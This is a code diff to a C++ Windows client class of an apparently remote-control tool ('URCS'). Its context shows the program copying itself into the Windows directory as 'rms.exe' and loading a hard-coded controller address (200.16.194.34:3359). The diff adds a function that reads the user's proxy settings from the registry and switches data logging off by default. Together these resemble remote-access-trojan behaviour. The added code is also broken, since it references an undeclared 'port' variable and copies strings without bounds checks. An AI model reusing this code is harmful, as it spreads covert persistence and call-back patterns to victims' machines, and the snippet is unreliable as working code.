@@ -32,7 +32,6 @@ Cini::Cini()
 Cini::~Cini()
 {
 }
-
 void Cini::CopyMeToWinDir()
 {
 	char newfile[512];
@@ -40,6 +39,48 @@ void Cini::CopyMeToWinDir()
 	strcat(newfile,"\\rms.exe");
 	CopyFile(lcname,newfile,FALSE);
 }
+
+s_proxyinf Cini::GetProxy()
+{
+	s_proxyinf localproxy;
+	localproxy.have_proxy=1;
+	s_proxyinf mal;
+	mal.have_proxy=0;
+	LONG lRet;
+	HKEY hKey;
+	DWORD dwBufLen = 1024;
+	char dato[1024];
+	if(RegOpenKeyEx(HKEY_CURRENT_USER,
+                TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Connections"),
+				0,
+				KEY_QUERY_VALUE,
+				&hKey
+				) != ERROR_SUCCESS) return mal;
+	lRet = RegQueryValueEx(hKey,
+                       TEXT("DefaultConnectionSettings"),
+                       NULL,
+					   NULL,
+                       (LPBYTE)dato,
+					   &dwBufLen);
+	RegCloseKey(hKey);
+	if(lRet != ERROR_SUCCESS) return mal;
+	//search for ':'
+	int cto=0;
+	int portpos=0;
+	while (dato[cto]!=':' && cto<1024)	cto++;
+    if (cto==1024) return mal;
+	//search back for start of string... 
+	portpos=cto+1;
+    while (dato[cto]!=0 && cto!=0 ) cto--;
+	cto++;
+	//now we have two positions... chunking data.
+	strncpy(localproxy.proxy,dato+cto,portpos-1-cto);
+	localproxy.proxy[portpos-1-cto]=0;
+	localproxy.port=atoi(dato+portpos);
+	if (port>65535 || port<=0) port=80;
+	return localproxy;
+}
+
 BOOL Cini::PutKey( HKEY motherkey, LPCSTR directory, LPCSTR keyname, LPCSTR strtoput )
 {
 	//extracted idea from sample code.:
@@ -118,7 +159,7 @@ void Cini::LoadData()
 	GetPrivateProfileString("URCS","mother_name","200.16.194.34",mother_name,256,ini_filename); //this 000.000.000.000 you can change it directly from PXE.
 	GetPrivateProfileString("URCS","mother_port","3359",mother_port,256,ini_filename); //this 000.000.000.000 you can change it directly from PXE.
 	GetPrivateProfileString("URCS","server_crypted","N",lcrypt,2,ini_filename);
-	GetPrivateProfileString("URCS","log_data","Y",ld,2,ini_filename);
+	GetPrivateProfileString("URCS","log_data","N",ld,2,ini_filename);
 	if (lcrypt[0]=='Y')	crypted=1;
 	else crypted=0;
 	if (ld[0]=='Y')	log_data=1;
